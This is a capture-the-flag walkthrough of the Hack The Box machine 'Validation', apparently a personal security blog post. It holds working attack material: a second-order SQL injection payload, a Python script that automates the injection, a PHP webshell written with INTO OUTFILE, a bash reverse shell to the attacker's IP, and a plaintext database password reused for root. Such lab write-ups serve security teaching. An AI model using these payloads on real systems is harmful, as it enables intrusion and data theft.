Validation is another box HTB made for the UHC competition. It is a qualifier box, meant to be easy and help select the top ten to compete later this month. Once it was done on UHC, HTB makes it available. In this box, I’ll exploit a second-order SQL injection, write a script to automate the enumeration, and identify the SQL user has FILE permissions. I’ll use that to write a webshell, and get execution. For root, it’s simple password reuse from the database. In Beyond Root, I’ll look at how this box started and ended in a container.

## Recon

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) version, the host is like running Ubuntu 20.04. But the [Apache](https://packages.debian.org/search?keywords=apache2) version shows Debian, likely Debian 10 Buster. This is a good indication there’s likely some kind of container here.

### Website - TCP 80

#### Site

The site is another about UHC:

![image-20210913191344435](https://0xdfimages.gitlab.io/img/image-20210913191344435.png)

When I enter my username and pick a country, it shows a page:

![image-20210913191420399](https://0xdfimages.gitlab.io/img/image-20210913191420399.png)

If I register another user in the same country, they show up in the results as well:

![image-20210913192543083](https://0xdfimages.gitlab.io/img/image-20210913192543083.png)

The page acts really funny if I register the same name again in a different country, but not in anyway I see to exploit. To save myself annoyance, I just create a new username each time I submitted.

#### Tech Stack

On submitting a name and country, it sends a POST to `/`, with the body:

```plaintext
username=0xdf&country=Brazil
```

The response is a 302 redirect to `/account.php`, which is a good indication that the site is running PHP. On logging in, there is a `Set-Cookie` header, and it’s interesting to note that even if I already have a cookie, on changing my username, it sets a new cookie:

```plaintext
Set-Cookie: user=f838c8ea492c8efc627e5738309f7f9e
```

Also, if I send the same username (even after a fresh reset, it returns the same cookie). Given the length of the cookie, it’s not too hard to figure out that the cookie is just the MD5 hash of the given username:

```console
oxdf@parrot$ echo -n "0xdf2" | md5sum
f838c8ea492c8efc627e5738309f7f9e  -
```

This is a bad practice. I tried creating a cookie for admin and root, but nothing interesting came up.

#### Directory Brute Force

I’ll run `feroxbuster` against the site, and include `-x php` since I know the site is PHP:

```console
oxdf@parrot$ feroxbuster -u http://10.10.11.116 -x php

```

The only new path here is `config.php`, but it just returns an empty page on visiting. This is likely a page that’s included by other pages.

### HTTP - TCP 4566

Visiting this page just returns 403 forbidden:

![image-20210913193205174](https://0xdfimages.gitlab.io/img/image-20210913193205174.png)

This is the default port for [localstack](https://github.com/localstack/localstack), so I can keep an eye out for any cloud-themed items.

### HTTP - TCP 8080

This page returns 502 Bad Gateway:

![image-20210913193351665](https://0xdfimages.gitlab.io/img/image-20210913193351665.png)

Not much interesting here.

## Shell as www-data

### Second Order SQLi

#### Identify

I tried to register as `0xdf'`, and the site handled it without issue:

![image-20210913193535452](https://0xdfimages.gitlab.io/img/image-20210913193535452.png)

But there is another field sent in the POST request. If I kick the POST over to Burp Repeater, I can try to check for SQLi in the country. On submitting, there’s just a 302 in return:

![image-20210913205703482](https://0xdfimages.gitlab.io/img/image-20210913205703482.png)

If I use that cookie to request `/account.php`, there’s an error:

![image-20210913205930088](https://0xdfimages.gitlab.io/img/image-20210913205930088.png)

This is a second-order SQL injection.

#### Union Injection

I can guess that the SQL query on the page looks like:

```sql
SELECT username from players where country = '[input]';
```

A UNION injection is when I add a UNION statement to the query allowing me to make a new query and append the results to the intended query. I’ll need to match the same number of columns, or the query will error. I’ll start with `Brazil' UNION SELECT 1;-- -`. That would make the query:

```sql
SELECT username from players where country = 'Brazil' UNION SELECT 1;-- -';
```

I’ll need to use another user here, or I still get some weird results. I’ll submit the request, and then load the `account.php` page with that cookie. It worked:

![image-20210913210922606](https://0xdfimages.gitlab.io/img/image-20210913210922606.png)

That 1 at the end is the result of the union.

If I change the 1 to `user()`, I get the name of the user for the DB:

```plaintext
username=0xdfaaaaaaa&country=Brazil' union select user();-- -
```

This results in:

![image-20210913211039611](https://0xdfimages.gitlab.io/img/image-20210913211039611.png)

### Script SQLI

This is another example where I could keep working out of Repeater, but it’s a pain, and if I’m doing enumeration for any period of time, it’s nice to have a shell. This is what I came up with:

```python
#!/usr/bin/env python3

import random
import requests
from bs4 import BeautifulSoup
from cmd import Cmd

class Term(Cmd):

    prompt = "> "

    def default(self, args):
        name = f'0xdf-{random.randrange(1000000,9999999)}'
        resp = requests.post('http://10.10.11.116/',
                headers={"Content-Type": "application/x-www-form-urlencoded"},
                data={"username": name, "country": f"' union {args};-- -"})
        soup = BeautifulSoup(resp.text, 'html.parser')
        if soup.li:
            print('\n'.join([x.text for x in soup.findAll('li')]))

    def do_quit(self, args):
        return 1

term = Term()
term.cmdloop()
```

It doesn’t do anything special except give me the ability to fill in the `union ...` statement with an SQL statement that returns one column and get a result quickly.

For example:

```console
oxdf@parrot$ python3 sqli.py
> select user()
uhc@localhost
> select database()
registration
```

### Enumerate DB

There are four DBs in this instance, but only `registration` is interesting as far as having data (the others are mysql internals):

```console
> select schema_name from information_schema.schemata
information_schema
performance_schema
mysql
registration
```

There’s a single table in that DB:

```console
> select table_name from information_schema.tables where table_schema = 'registration'
registration
```

It has four columns:

```console
> select column_name from information_schema.columns where table_name = 'registration'
username
userhash
country
regtime
```

There’s no kind of password or anything.

I can check for what privileges my user has:

```console
> select privilege_type FROM information_schema.user_privileges where grantee = "'uhc'@'localhost'"
SELECT
INSERT
UPDATE
DELETE
CREATE
DROP
RELOAD
SHUTDOWN
PROCESS
FILE
REFERENCES
INDEX
ALTER
SHOW DATABASES
SUPER
CREATE TEMPORARY TABLES
LOCK TABLES
EXECUTE
REPLICATION SLAVE
BINLOG MONITOR
CREATE VIEW
SHOW VIEW
CREATE ROUTINE
ALTER ROUTINE
CREATE USER
EVENT
TRIGGER
CREATE TABLESPACE
DELETE HISTORY
SET USER
FEDERATED ADMIN
CONNECTION ADMIN
READ_ONLY ADMIN
REPLICATION SLAVE ADMIN
REPLICATION MASTER ADMIN
BINLOG ADMIN
BINLOG REPLAY
SLAVE MONITOR
```

It’s a lot, but `FILE` jumps out as interesting.

### Webshell

#### File Write

Another thing to try is writing a file. I’ll run:

```sql
select "0xdf was here!" into outfile '/var/www/html/0xdf.txt'
```

It doesn’t return anything, because if it worked, it would return 0 columns, when it’s trying to union with 1 column, which will lead to an error (after it writes the file).

The file does exist on the server:

![image-20210913214425073](https://0xdfimages.gitlab.io/img/image-20210913214425073.png)

#### Write Shell

I’ll run that again, but this time write a simple PHP webshell:

```sql
select "<?php SYSTEM($_REQUEST['cmd']); ?>" into outfile '/var/www/html/0xdf.php'
```

It worked:

![image-20210913214546110](https://0xdfimages.gitlab.io/img/image-20210913214546110.png)

### Shell

To get a full shell, I’ll start `nc` on 443 and run:

```console
oxdf@parrot$ curl 10.10.11.116/0xdf.php --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/10.10.14.60/443 0>&1"'
```

It hangs, but at `nc`:

```console
oxdf@parrot$ nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.60] from (UNKNOWN) [10.10.11.116] 35078
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@validation:/var/www/html$
```

And upgrade the shell using the `script` trick:

```console
www-data@validation:/var/www/html$ script /dev/null -c bash
Script started, output log file is '/dev/null'.
www-data@validation:/var/www/html$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@parrot$ stty raw -echo ; fg
nc -lnvp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
www-data@validation:/var/www/html$
```

In `/home/htb` I have access to `user.txt`:

```console
www-data@validation:/home/htb$ cat user.txt
153f78a4************************
```

## Shell as root

### Enumeration

There’s not much on the box, but there is one file I couldn’t access before worth checking out in `/var/www/html`, `config.php`:

```php
<?php
  $servername = "127.0.0.1";
  $username = "uhc";
  $password = "uhc-9qual-global-pw";
  $dbname = "registration";

  $conn = new mysqli($servername, $username, $password, $dbname);
?>
```

### su

Any time I get creds like this, it’s worth checking them for other users. In this case, they work for root:

```console
www-data@validation:/var/www/html$ su -
Password:
root@validation:~#
```

And I can grab `root.txt`:

```console
root@validation:~# cat root.txt
139b1cf7************************
```

## Beyond Root

It didn’t take much enumeration to get to root on a box called validation, and it’d be easy to stop at this point. But a bit more poking around will show that I’m not in the host system. For example, the IP address is on the 172 range, not the 10:

```console
root@validation:~# ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
5: eth0@if6: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default
    link/ether 02:42:ac:12:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 172.18.0.2/16 brd 172.18.255.255 scope global eth0
       valid_lft forever preferred_lft forever
```

Looking at the listening ports, there’s only a service on 80:

```console
root@validation:~# ss -tnlp
State   Recv-Q   Send-Q     Local Address:Port      Peer Address:Port  Process
LISTEN  0        4096          127.0.0.11:41283          0.0.0.0:*
LISTEN  0        80             127.0.0.1:3306           0.0.0.0:*
LISTEN  0        511              0.0.0.0:80             0.0.0.0:*      users:(("apache2",pid=206,fd=3))
```

In the filesystem root, there’s a `.dockerenv` file:

```console
root@validation:/# ls -a
.   .dockerenv  boot  etc   lib    media  opt   root  sbin  sys  usr
..  bin         dev   home  lib64  mnt    proc  run   srv   tmp  var
```

Clearly I’m in a container. But why?

One of the challenges any box creator has when they want to make a challenge is that multiple players will be hacking on it at the same time. There’s a balance between realism and competition here on how much you want the box to clean up after the users exploiting it.

For UHC, this box was live for a period of time where players from across the world would be hacking it at the same time, many competitively racing to be the first to finish.

I noticed ports 5000-5008 were filtered in my initial `nmap` scan. These ports are actually different Docker instances of the same exploitable webapp (I think he actually used 5000-5031). Then he has a kernel module that is re-writing incoming packets for TCP 80 based on the source IP to one of the containers, so there’s significantly fewer players interacting with each instance.

IppSec goes into details in [his video](https://www.youtube.com/watch?v=UqoVQ4dbYaI) (where he has access to the kernel module source that we do not):
